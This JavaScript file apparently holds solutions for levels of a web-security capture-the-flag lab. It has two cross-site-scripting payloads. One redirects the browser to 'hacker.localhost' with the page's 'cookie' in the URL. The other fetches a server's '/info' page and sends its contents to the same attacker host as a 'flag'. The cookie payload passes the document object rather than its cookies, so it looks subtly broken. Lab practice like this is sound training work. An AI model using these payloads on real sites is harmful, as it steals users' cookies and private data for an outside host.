function lv_13() {
    var baseUrl = 'http://hacker.localhost:8776';
    var url = baseUrl + '?cookie=' + document;
    window.location.href = url;
}

function lv_14() {
    var hackerUrl = 'http://hacker.localhost:8776';
    var serverUrl = 'http://challenge.localhost:80/info';

    fetch(serverUrl)
        .then(response => response.text())
        .then(data => {
            window.location.href = hackerUrl + '?flag=' + data;
        })
        .catch(error => {
            console.error('There was a problem with the fetch operation:', error);
        });
}
